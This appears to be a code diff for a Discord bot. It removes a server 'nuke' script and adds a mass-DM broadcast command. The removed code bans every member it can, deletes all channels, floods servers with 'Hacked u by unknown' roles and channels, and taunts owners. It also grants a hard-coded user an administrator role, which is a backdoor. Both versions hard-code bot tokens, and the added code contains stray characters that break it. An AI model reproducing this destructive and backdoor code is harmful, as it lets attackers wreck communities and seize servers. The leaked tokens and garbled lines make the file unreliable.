@@ -1,481 +1,421 @@
-const Discord = require("discord.js");
-const LOka = new Discord.Client();
-console.log('By KBOOOOOOOOSH-YT');
-LOka.on('ready', () => {
-  console.log(`Logged in as ${LOka.user.tag} !`);
+client.on('message', message => {
+if(message.author.bot) return;
+if(message.channel.type === 'dm') return;
+    if(message.content.startsWith(prefix + 'bc')) {
+     let filter = m => m.author.id === message.author.id;
+ 
+ let recembed = new Discord.RichEmbed()
+ .setTitle(`${client.user.username}`)
+ .setDescription(`
+ -=-=-=-=-=-=-=-=-=-=
+ ًںژ– Broadcast sends to a specific role without embed
+ 
+ ًںڈ… Broadcast sends to a specific role with embed
+ 
+ ًں“­ Broadcast sends for all members with embed
+ 
+ ًں“§ Broadcast sends for all members without embed
+ 
+ ًں”µ Broadcast sends for online members only without embed
+ 
+ ًں”· Broadcast sends for online members only with embed
+ 
+ â‌Œ To Cancel the process
+ -=-=-=-=-=-=-=-=-=-=
+ `)
+ 
+ message.channel.sendEmbed(recembed).then(msg => { 
+     msg.react('ًںژ–')
+     .then(() => msg.react('ًںڈ…'))
+     .then(() => msg.react('ًں“­'))
+     .then(() =>  msg.react('ًں“§'))
+     .then(() => msg.react('ًں”µ'))
+     .then(() => msg.react('ًں”·'))
+     .then(() => msg.react('â‌Œ'))
 
-});
-LOka.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
+ 
+             let embedmsgFilter = (reaction, user) => reaction.emoji.name === 'ًں“­' && user.id === message.author.id;
+ 
+             let normalmsgFilter = (reaction, user) => reaction.emoji.name === 'ًں“§' && user.id === message.author.id;
+ 
+             let cancelFilter = (reaction, user) => reaction.emoji.name === 'â‌Œ' && user.id === message.author.id;
+ 
+             let onlyroleFilter = (reaction, user) => reaction.emoji.name === 'ًںژ–' && user.id === message.author.id;8
+ 
+             let onlineonlyFilter = (reaction, user) => reaction.emoji.name === 'ًں”µ' && user.id === message.author.id;8
 
-        
-    
+             let embedonlineonlyFilter = (reaction, user) => reaction.emoji.name === 'ًں”·' && user.id === message.author.id;8
 
-});
-var prefix = "-"
-LOka.on("message", message => {
-  if(!message.content.startsWith(prefix)) return;;
-  let args = message.content.split(" ").slice(1);
-  var argresult = args.join(' ');
-  if (message.content.startsWith('hix15')) {
-    LOka.user.setUsername(argresult);
-  }
-    if (message.content.startsWith(prefix + 'on123')) {
-    LOka.user.setStatus(argresult);
-  }
-});
-
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
-
-}
-});
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setUsername("Hacked u by unknown Is here")
-
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
-
-}
-});
-
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
-})
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by unknown Is here`)
-})
-}
-});
-
-LOka.on('message', message => {
-     if (message.content === ".") {
-                 if(!message.channel.guild) return;
-
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
-
-}
-});
-
-LOka.on('message', message => {
+             let embedonlyroleFilter = (reaction, user) => reaction.emoji.name === 'ًںڈ…' && user.id === message.author.id;8
+ 
+             let embedmsg = msg.createReactionCollector(embedmsgFilter, { time: 0 });
+ 
+             let normalmsg = msg.createReactionCollector(normalmsgFilter, { time: 0 });
      
-
-     if (message.content === "k1") {
-         LOka.guilds.forEach(m =>{
-  m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    }) 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-     m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    }) 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    }) 
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by unknown Is here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-
-
-    
-})
+             let onlyrole = msg.createReactionCollector(onlyroleFilter, { time: 0 });
  
+             let embedonlyrole = msg.createReactionCollector(embedonlyroleFilter, { time: 0 });
+
+             let onlineonly = msg.createReactionCollector(onlineonlyFilter, { time: 0 });
+                 
+             let embedonlineonly = msg.createReactionCollector(embedonlineonlyFilter, { time: 0 });
+
+             let cancel = msg.createReactionCollector(cancelFilter, { time: 0 });
  
-}
-});
-LOka.on('message', message => {
-         if (message.content === "k") {
-               LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
+ embedonlineonly.on('collect', r => {
 
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-m.createChannel('Hacked u by unknown Is here', 'text');
-m.createChannel('Hacked u by unknown Is here', 'text');
-
-})
-}
-});
-
-LOka.on('message', message => {
-         if (message.content === "k") {
-                 LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-
-
-
-})
-}
-
-});
-
-
-const { Client } = require('discord.js');
-const client = new Client();
-
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
-
-  await guild.fetchMembers();
-
-  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
-
-
-
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
-  
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
-  
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
-
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
-
-  
-
-}
-
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by YzhF1");
-  console.log("");
-  console.log("-------------------------------------------------------------");
-
-});
-
-LOka.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
-
-LOka.on('guildMemberAdd', member => {
+    let msge;
+    message.channel.send(':pencil: **| Please Write Now The Message To Send :pencil2: **').then(msg => {
     
-            if (member.id === "456484018964135936") {
-                member.guild.createRole({
-                    name : LOka.user.username,
-                    color : "RANDOM", 
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
+           message.channel.awaitMessages(filter, {
+             max: 1,
+             time: 90000,
+             errors: ['time']
+           })
+           .then(collected => {
+               collected.first().delete();
+               msge = collected.first().content;
+               msg.edit('âœ… **| Do You Want A Mention In The Msg ? [yes OR no] **').then(msg => {
+                 message.channel.awaitMessages(filter, {
+                   max: 1,
+                   time: 90000,
+                   errors: ['time']
+                 })
+                 .then(collected => {
+                   if(collected.first().content === 'yes') {
+   message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+   
+   
+   message.guild.members.filter(m => m.presence.status === 'online').forEach(m => {
+    var bc = new Discord.RichEmbed()
+           .setColor('RANDOM')
+           .setTitle(`:mega: New Broadcast`)
+           .addField('ًں”°Serverًں”°', message.guild.name)
+           .addField('ًںڑ©Senderًںڑ©', message.author.username)
+           .addField('ًں“œMessageًں“œ', `${msge}`)
+           .setThumbnail('https://a.top4top.net/p_1008gqyyd1.png')
+           .setFooter(client.user.username, client.user.avatarURL);
+           m.send({ embed: bc })
+           m.send(`${m}`)
+           
+       })
+   }})
+   if(collected.first().content === 'no') {
+   message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+   message.guild.members.filter(m => m.presence.status === 'online').forEach(m => {
+    var bc = new Discord.RichEmbed()
+           .setColor('RANDOM')
+           .setTitle(`:mega: New Broadcast`)
+           .addField('ًں”°Serverًں”°', message.guild.name)
+           .addField('ًںڑ©Senderًںڑ©', message.author.username)
+           .addField('ًں“œMessageًں“œ', `${msge}`)
+           .setThumbnail('https://a.top4top.net/p_1008gqyyd1.png')
+           .setFooter(client.user.username, client.user.avatarURL);
+           m.send({ embed: bc })
+           
+       })
+   }
+                 
+   })
+               })
+           })
+       })
+ 
+       
+ onlineonly.on('collect', r => {
+    let msge;
+    message.channel.send(':pencil: **| Please Write Now The Message To Send :pencil2: **').then(msg => {
+ 
+        message.channel.awaitMessages(filter, {
+          max: 1,
+          time: 90000,
+          errors: ['time']
+        })
+        .then(collected => {
+            collected.first().delete();
+            msge = collected.first().content;
+            msg.edit('âœ… **| Do You Want A Mention In The Msg ? [yes OR no] **').then(msg => {
+              message.channel.awaitMessages(filter, {
+                max: 1,
+                time: 90000,
+                errors: ['time']
+              })
+              .then(collected => {
+
+                if(collected.first().content === 'yes') {
+message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
                 
-            }
+
+message.guild.members.filter(m => m.presence.status === 'online').forEach(m => {
+    m.send(`${msge}`) 
+m.send(`${m}`)       
         
-    });
+    })
+}
+if(collected.first().content === 'no') {
+message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+message.guild.members.filter(m => m.presence.status === 'online').forEach(m => {
+    m.send(`${msge}`) 
+                
+    })}
+})
+})
+        })
+    })
+})
 
+ embedmsg.on('collect', r => {
+     let msge;
+  message.channel.send(':pencil: **| Please Write Now The Message To Send :pencil2: **').then(msg => {
+  
+         message.channel.awaitMessages(filter, {
+           max: 1,
+           time: 90000,
+           errors: ['time']
+         })
+         .then(collected => {
+             collected.first().delete();
+             msge = collected.first().content;
+             msg.edit('âœ… **| Do You Want A Mention In The Msg ? [yes OR no] **').then(msg => {
+               message.channel.awaitMessages(filter, {
+                 max: 1,
+                 time: 90000,
+                 errors: ['time']
+               })
+               .then(collected => {
+                 if(collected.first().content === 'yes') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+ 
+ 
+     message.guild.members.forEach(m => {
+         var bc = new Discord.RichEmbed()
+         .setColor('RANDOM')
+         .setTitle(`:mega: New Broadcast`)
+         .addField('ًں”°Serverًں”°', message.guild.name)
+         .addField('ًںڑ©Senderًںڑ©', message.author.username)
+         .addField('ًں“œMessageًں“œ', `${msge}`)
+         .setThumbnail('https://a.top4top.net/p_1008gqyyd1.png')
+         .setFooter(client.user.username, client.user.avatarURL);
+         m.send({ embed: bc })
+         m.send(`${m}`)
+         
+     })
+ }})
+ if(collected.first().content === 'no') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+     message.guild.members.forEach(m => {
+         var bc = new Discord.RichEmbed()
+         .setColor('RANDOM')
+         .setTitle(`:mega: New Broadcast`)
+         .addField('ًں”°Serverًں”°', message.guild.name)
+         .addField('ًںڑ©Senderًںڑ©', message.author.username)
+         .addField('ًں“œMessageًں“œ', `${msge}`)
+         .setThumbnail('https://a.top4top.net/p_1008gqyyd1.png')
+         .setFooter(client.user.username, client.user.avatarURL);
+         m.send({ embed: bc })
+         
+     })
+ }
+               
+ })
+             })
+         })
+     })
+ 
+ 
     
+ 
+ 
+ 
+ normalmsg.on('collect', r => {
+     let msge;
+     message.channel.send(':pencil: **| Please Write Now The Message To Send :pencil2: **').then(msg => {
+  
+         message.channel.awaitMessages(filter, {
+           max: 1,
+           time: 90000,
+           errors: ['time']
+         })
+         .then(collected => {
+             collected.first().delete();
+             msge = collected.first().content;
+             msg.edit('âœ… **| Do You Want A Mention In The Msg ? [yes OR no] **').then(msg => {
+               message.channel.awaitMessages(filter, {
+                 max: 1,
+                 time: 90000,
+                 errors: ['time']
+               })
+               .then(collected => {
+ 
+                 if(collected.first().content === 'yes') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+                 
+ 
+     message.guild.members.forEach(m => {
+ m.send(`${msge}`) 
+ m.send(`${m}`)       
+         
+     })
+ }
+ if(collected.first().content === 'no') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+     message.guild.members.forEach(m => {
+         m.send(`${msge}`) 
+                 
+     })}
+ })
+ })
+         })
+     })
+ })
+ 
+ onlyrole.on('collect', r => {
+     let msge;
+     let role;
+     message.channel.send(':pencil: **| Please Write Now The Message To Send :pencil2: **').then(msg => {
+  
+         message.channel.awaitMessages(filter, {
+           max: 1,
+           time: 90000,
+           errors: ['time']
+         })
+ 
+         .then(collected => {
+             collected.first().delete();
+             msge = collected.first().content;
+                 msg.edit('âœ… **| Now Please Write The Role Name**').then(msg => {
+                 message.channel.awaitMessages(filter, {
+                     max: 1,
+                     time: 90000,
+                     errors: ['time']
+                   })
+         
+         .then(collected => {
+             collected.first().delete();
+             role = collected.first().content;
+                 let rolecheak = message.guild.roles.find('name', `${role}`)
+             msg.edit('âœ… **| Do You Want A Mention In The Msg ? [yes OR no] **').then(msg => {
+               message.channel.awaitMessages(filter, {
+                 max: 1,
+                 time: 90000,
+                 errors: ['time']
+               })
+               .then(collected => {
+ 
+                 if(collected.first().content === 'yes') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+                 
+ 
+             message.guild.members.filter(m => m.roles.get(rolecheak.id)).forEach(m => {
+ 
+ m.send(`${msge}`) 
+ m.send(`${m}`)       
+         
+     })
+ }
+ if(collected.first().content === 'no') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+         message.guild.members.filter(m => m.roles.get(rolecheak.id)).forEach(m => {
+ 
+         m.send(`${msge}`) 
+                 
+     })}
+ })
+ })
+         })
+     })
+ })
+ })
+ });
+ 
+ 
+ 
+ embedonlyrole.on('collect', r => {
+     let msge;
+     let role;
+     message.channel.send(':pencil: **| Please Write Now The Message To Send :pencil2: **').then(msg => {
+  
+         message.channel.awaitMessages(filter, {
+           max: 1,
+           time: 90000,
+           errors: ['time']
+         })
+ 
+         .then(collected => {
+             collected.first().delete();
+             msge = collected.first().content;
+                 msg.edit('âœ… **| Now Please Write The Role Name**').then(msg => {
+                 message.channel.awaitMessages(filter, {
+                     max: 1,
+                     time: 90000,
+                     errors: ['time']
+                   })
+         
+         .then(collected => {
+             collected.first().delete();
+             role = collected.first().content;
+                 let rolecheak = message.guild.roles.find('name', `${role}`)
+             msg.edit('âœ… **| Do You Want A Mention In The Msg ? [yes OR no] **').then(msg => {
+               message.channel.awaitMessages(filter, {
+                 max: 1,
+                 time: 90000,
+                 errors: ['time']
+               })
+               .then(collected => {
+ 
+                 if(collected.first().content === 'yes') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+                 
+ 
+                     message.guild.members.filter(m => m.roles.get(rolecheak.id)).forEach(m => {
+                         var bc = new Discord.RichEmbed()
+         .setColor('RANDOM')
+         .setTitle(`:mega: New Broadcast`)
+         .addField('ًں”°Serverًں”°', message.guild.name)
+         .addField('ًںڑ©Senderًںڑ©', message.author.username)
+         .addField('ًں“œMessageًں“œ', `${msge}`)
+         .setThumbnail('https://a.top4top.net/p_1008gqyyd1.png')
+         .setFooter(client.user.username, client.user.avatarURL);
+         m.send({ embed: bc })
+ m.send(`${m}`)       
+         
+     })
+ }
+ if(collected.first().content === 'no') {
+ message.channel.send(`**:white_check_mark: The Message Has Been Sent The Members :loudspeaker:**`);
+ message.guild.members.filter(m => m.roles.get(rolecheak.id)).forEach(m => {
+         var bc = new Discord.RichEmbed()
+         .setColor('RANDOM')
+         .setTitle(`:mega: New Broadcast`)
+         .addField('ًں”°Serverًں”°', message.guild.name)
+         .addField('ًںڑ©Senderًںڑ©', message.author.username)
+         .addField('ًں“œMessageًں“œ', `${msge}`)
+         .setThumbnail('https://a.top4top.net/p_1008gqyyd1.png')
+         .setFooter(client.user.username, client.user.avatarURL);
+         m.send({ embed: bc })
+         
+                 
+     })}
+ })
+ })
+         })
+     })
+ })
+ })
+ })
+     cancel.on('collect', r => {
+         let cancelembed = new Discord.RichEmbed()
+         .setTitle('Successfully Canceled :x:')
+      message.channel.sendEmbed(cancelembed)
+         embedmsg.stop();
+         normalmsg.stop();
+         onlyrole.stop();
+         embedonlyrole.stop();
+         embedonlineonly.stop()
+         onlineonly.stop()
+         cancel.stop();
+     })
+ })
+    }});
 
-
-
-
-LOka.login("NTUyNDkwMTYxOTg0ODk3MDI0.D2AS8w.QBVtJLLzyMtIYtwyNN2x3zAZAbc")
+client.login('NTUyNTczODMwMTI4NzMwMTE0.D2BgRA.RLZdInH0SiveQI0bZF9mR7t7Lj0') 
